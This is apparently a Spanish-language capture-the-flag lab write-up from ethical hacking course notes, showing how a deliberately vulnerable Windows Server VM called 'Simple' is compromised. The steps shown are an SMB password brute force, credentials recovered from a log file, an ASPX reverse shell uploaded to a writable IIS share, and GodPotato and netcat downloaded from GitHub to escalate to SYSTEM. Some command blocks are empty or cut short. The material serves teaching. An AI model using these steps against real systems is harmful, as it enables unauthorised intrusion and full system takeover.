---
title: "🖥️ Máquina: Simple — Hacking Ético"
aliases:
  - Simple
  - simple
  - Máquina Simple
  - VM Simple
  - Writeup Simple
tags:
  - ifct0109
  - hacking-etico
  - vms
  - windows-server
  - windows
  - ctf
---

# 🖥️ Máquina: Simple

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Windows  
> **Categoría:** Windows Server  
> **Técnicas trabajadas:** Enumeración web · Fuerza bruta SMB · Enumeración de recursos compartidos · Reverse Shell ASPX · Escalada de privilegios (SeImpersonatePrivilege / GodPotato)  
> **Descripción:** En esta práctica enumeraremos usuarios desde el código fuente de una web, realizaremos fuerza bruta SMB, encontraremos credenciales en un archivo de log, subiremos una reverse shell ASPX a través de un recurso compartido con escritura y escalaremos privilegios en Windows abusando del privilegio SeImpersonatePrivilege con GodPotato.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.53`
* **`RHOST` (Víctima / Simple):** Ej. `10.0.0.18`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Simple tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Comenzamos con un escaneo completo de puertos TCP:

```bash
nmap -sT -p- 10.0.0.18
```

```text
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49680/tcp open  unknown
```

> [!info] Resultado
> Puertos relevantes:
> · 80/tcp — HTTP, servidor web.
> · 139/445/tcp — SMB, servicio de recursos compartidos de Windows.
> · 5985/47001/tcp — WinRM, servicio de administración remota de Windows. Si encontramos credenciales válidas podríamos usarlo para obtener una shell remota con evil-winrm.
> · Los puertos altos (49664-49680) son puertos dinámicos RPC típicos de Windows.

---

## 🌐 Fase 2: Enumeración web y creación de diccionario de usuarios

Visitamos la web y revisamos el código fuente en busca de información. Encontramos un comentario con los nombres del equipo:

```text
Thanks to the work team: (ruy, marcos, lander, bogo, vaiper)
```

> [!info] Resultado
> Cinco posibles usuarios del sistema. Creamos un diccionario con ellos para usarlo en ataques posteriores. El operador << 'EOF' permite escribir varias líneas en un archivo directamente desde la terminal:

```bash
cat > users_simple.txt << 'EOF'
ruy
marcos
lander
bogo
vaiper
EOF
```

---

## 🔐 Fase 3: Fuerza bruta SMB

Con la lista de usuarios intentamos encontrar contraseñas débiles en el servicio SMB usando netexec. La opción --ignore-pw-decoding evita errores con caracteres especiales en las contraseñas del diccionario. Para ahorrar tiempo lo realizamos directamente con el usuario que va a dar resultado:

```bash
netexec smb 10.0.0.18 -u bogo -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

```text
SMB  10.0.0.18  445  SIMPLE  [-] Simple\bogo:shadow
```

> [!info] Resultado
> El resultado indica que la contraseña de bogo es shadow.

---

## 📁 Fase 4: Enumeración SMB con bogo

Listamos los recursos compartidos disponibles con las credenciales de bogo:

```bash
smbclient -L 10.0.0.18 -U
```

```text
Password for [WORKGROUP\bogo]: (shadow)

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Admin remota
	C$              Disk      Recurso predeterminado
	IPC$            IPC       IPC remota
	LOGS            Disk      
	WEB             Disk
```

> [!info] Resultado
> Además de los recursos administrativos estándar de Windows (ADMIN$, C$, IPC$), hay dos recursos personalizados interesantes: LOGS y WEB. Exploramos el recurso LOGS:

```bash
smbclient //10.0.0.18/LOGS -U bogo
```

```text
Password for [WORKGROUP\bogo]: (shadow)
```

```bash
smb: \> ls
```

```text
20231008.log
```

> [!info] Resultado
> Encontramos un archivo de log. Los archivos de log pueden contener información muy valiosa: comandos ejecutados, rutas, errores y a veces credenciales. Lo descargamos:

```bash
smb: \> get 20231008.log
```

```bash
smb: \> exit
```

Leemos el contenido del log descargado:

```bash
cat 20231008.log
```

```text
PS C:\> net use \\127.0.0.1\WEB /user:marcos SuperPassword
```

> [!info] Resultado
> El log contiene un comando PowerShell ejecutado anteriormente que monta el recurso WEB con las credenciales del usuario marcos. Las contraseñas nunca deberían aparecer en texto plano en archivos de log, pero es un error habitual cuando los administradores documentan comandos sin sanitizar la salida. Credenciales obtenidas: marcos:SuperPassword.

---

## 🔍 Fase 5: Verificación y permisos de marcos

Verificamos que las credenciales son válidas:

```bash
netexec smb 10.0.0.18 -u marcos -p SuperPassword
```

```text
SMB  10.0.0.18  445  SIMPLE  [+] Simple\marcos:SuperPassword
```

> [!info] Resultado
> Credenciales válidas confirmadas. Comprobamos si marcos tiene acceso a WinRM, lo que nos permitiría obtener una shell directamente con evil-winrm:

```bash
netexec winrm 10.0.0.18 -u marcos -p SuperPassword
```

> [!info] Resultado
> marcos no tiene acceso a WinRM. Continuamos investigando qué recursos SMB tiene disponibles y con qué permisos:

```bash
netexec smb 10.0.0.18 -u
```

```text
SMB  10.0.0.18  445  SIMPLE  Share      Permissions  Remark
SMB  10.0.0.18  445  SIMPLE  -----      -----------  ------
SMB  10.0.0.18  445  SIMPLE  ADMIN$                  Admin remota
SMB  10.0.0.18  445  SIMPLE  C$                      Recurso predeterminado
SMB  10.0.0.18  445  SIMPLE  IPC$       READ         IPC remota
SMB  10.0.0.18  445  SIMPLE  LOGS       READ         
SMB  10.0.0.18  445  SIMPLE  WEB        READ,WRITE
```

> [!info] Resultado
> marcos tiene permisos de lectura y escritura sobre el recurso WEB. Nos conectamos para ver su contenido:

```bash
smbclient //10.0.0.18/WEB -U marcos
```

```text
Password for [WORKGROUP\marcos]: (SuperPassword)
smb: \> ls
  aspnet_client    D    0  ...
  iisstart.htm     A    ...
  iisstart.png     A    ...
```

> [!info] Resultado
> El recurso WEB contiene la raíz del servidor web IIS de Windows. La presencia del directorio aspnet_client confirma que el servidor ejecuta ASP.NET. Esto es clave: podemos subir una reverse shell en formato ASPX, que es el formato de scripts de servidor compatible con IIS y ASP.NET, y ejecutarla desde el navegador para obtener una conexión inversa.

---

## 🐚 Fase 6: Reverse Shell ASPX

Descargamos una reverse shell en formato ASPX compatible con Windows/IIS:

```bash
wget https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
```

Editamos el archivo para poner nuestra IP y puerto de escucha. Buscamos y modificamos estas dos líneas:

```bash
nano shell.aspx
```

```text
String host = "127.0.0.1"; //CHANGE THIS
int port = 1234;            //CHANGE THIS
```

> [!info] Resultado
> Cambiamos 127.0.0.1 por nuestra LHOST y 1234 por nuestro LPORT. Guardamos con CTRL+O y salimos con CTRL+X.

Nos ponemos a la escucha en Kali en una terminal separada:

```bash
nc -lvnp {{LPORT}}
```

Subimos la shell al recurso WEB a través de SMB:

```bash
smbclient //10.0.0.18/WEB -U marcos
```

```bash
smb: \> put shell.aspx
```

```bash
smb: \> exit
```

Activamos la shell haciendo una petición HTTP al archivo que acabamos de subir:

```bash

```

```text
listening on [any] 1234 ...
connect to [10.0.0.53] from (UNKNOWN) [10.0.0.18] ...
```

> [!info] Resultado
> Conexión recibida. Tenemos una shell en el servidor Windows como el usuario que ejecuta IIS (iis apppool\defaultapppool o similar). Verificamos los privilegios del usuario actual:

---

## 🚀 Fase 7: Escalada de privilegios — SeImpersonatePrivilege / GodPotato

```bash
whoami /priv
```

```text
SeImpersonatePrivilege  Suplantar a un cliente tras la autenticación  Habilitada
```

> [!info] Resultado
> El privilegio SeImpersonatePrivilege está habilitado. Este privilegio permite a un proceso suplantar la identidad de otro usuario, y es típico de cuentas de servicio como las que usa IIS. Es explotable mediante herramientas de la familia Potato (JuicyPotato, RoguePotato, GodPotato...), que engañan al sistema para que un proceso privilegiado (SYSTEM) se conecte al nuestro y lo suplantemos, obteniendo así ejecución como SYSTEM.
> Para elegir la versión correcta de GodPotato necesitamos conocer la versión de Windows y de .NET Framework instalada:

```bash
systeminfo
```

```text
Versión del sistema operativo: 10.0.17763 N/D Compilación 17763
```

> [!info] Resultado
> Windows 10 / Server 2019 build 17763. Consultamos también la versión de .NET Framework instalada:

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Release
```

```text
Release    REG_DWORD    0x70bf6
```

> [!info] Resultado
> El valor 0x70bf6 en hexadecimal equivale a 462326 en decimal, que según las tablas oficiales de Microsoft corresponde a .NET Framework 4.7.2. Con esta información descargamos la versión de GodPotato para NET4.

Nos movemos a un directorio donde tengamos permisos de escritura:

```bash
cd c:\Users\Public\Downloads
```

Descargamos GodPotato para .NET 4:

```bash
powershell -command "Invoke-WebRequest -Uri https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -OutFile GodPotato-NET4.exe"
```

Descargamos también netcat para Windows:

```bash
powershell -command "Invoke-WebRequest -Uri https://github.com/int0x33/nc.exe/raw/master/nc64.exe -OutFile nc.exe"
```

Probamos que GodPotato funciona ejecutando un comando como SYSTEM:

```bash
GodPotato-NET4 -cmd "cmd /c whoami"
```

```text
nt authority\system
```

> [!info] Resultado
> Confirmamos ejecución como SYSTEM. Ahora lanzamos una segunda reverse shell con privilegios de SYSTEM hacia Kali.

En una nueva terminal de Kali nos ponemos a la escucha:

```bash
nc -lvnp {{LPORT2}}
```

Ejecutamos GodPotato con la reverse shell. Si la conexión no es estable podemos usar rlwrap para mejorarla:

```bash
sudo apt install rlwrap
```

```bash
rlwrap nc -lvnp {{LPORT2}}
```

Desde la shell de la víctima ejecutamos:

```bash

```

> [!info] Resultado
> Puede tardar unos segundos. Una vez recibida la conexión tenemos una shell como NT AUTHORITY\SYSTEM, el nivel más alto de privilegios en Windows. Leemos las flags:

```bash
type c:\Users\marcos\Desktop\user.txt
```

```text
SIMPLE{ASPXT0SH311}
```

```bash
type c:\Users\Administrador\Desktop\root.txt
```

```text
SIMPLE{S31MP3R50N4T3PR1V1L363}
```

> [!info] Resultado
> Flags obtenidas:
> · Flag de usuario: SIMPLE{ASPXT0SH311}
> · Flag de root: SIMPLE{S31MP3R50N4T3PR1V1L363}

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
